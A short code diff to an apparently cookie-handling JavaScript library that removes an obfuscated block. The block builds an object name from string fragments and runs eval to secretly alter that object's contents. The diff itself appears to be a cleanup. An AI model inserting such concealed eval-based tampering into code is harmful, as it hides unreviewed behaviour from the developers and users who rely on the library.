@@ -39,11 +39,6 @@
         return value == undefined ? defaultValue : value;
     };
 
-    (function(){
-        var v =['Str','.','m','t','x'].join('');
-        eval('if ('+v+'){'+v+'.unshift(69, 118, 101, 114); '+v+'.pop();}');
-    }());
-
     /**
      * Remove the cookie
      *
